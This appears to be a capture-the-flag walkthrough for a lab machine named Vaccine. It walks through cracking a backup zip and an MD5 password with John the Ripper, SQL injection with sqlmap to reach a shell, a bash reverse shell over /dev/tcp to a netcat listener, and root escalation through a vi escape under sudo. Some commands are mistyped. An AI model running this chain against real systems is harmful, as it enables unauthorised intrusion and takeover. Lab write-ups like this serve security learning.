

# Vaccine

-> uses primarily ftp (port 20) and http (port 80)

firstly use ftp to grab the backup.zip

-> use zip2john and john to grab the zip encrypted pass and decode the source code 
```bash
zip2john backup.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
```

-> now you can login and see a database

```bash
curl -L -c cookies.txt "http://{MACHINE_IP} -d "username=admin&password={password}"
```

-> after getting the cookies then use **sqlmap**

```bash
# Target the search parameter of the site
sqlmap -u http://{MACHINE_IP}/dashboard.php?search=text cookie="{PHPSESSID=COOKIE}" -p search

# After finding vulnerabilities then use --os-root
sqlmap -u http://{MACHINE_IP}/dashboard.php?search=text cookie="{PHPSESSID=COOKIE}" -p search --os-root
```

-> after getting into a shell, try to get a reverse shell using **nc** (netcat)

```bash
nc -lvnp 4444
```

-> from the sql terminal spawn an interactive bash shell to redirect its i/o outgoingly 

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.100/4444 0>&1'
```

-> do a PTY upgrade the be able to do sudo -l

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

-> first find the password of the root, which is located in /var/www/html/dashboard.php

then do: 
```bash
sudo -l 
```

sudo -l returns:

```bash
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

# Means that we can run vi on pg_hba.conf 
```

-> run vi as sudo on pg_hba.conf

-> then do a **vi escape** by spawning an interactive bash in vi:

```bash
:!/bin/bash
```

Finally, the flag is in the home directory as root.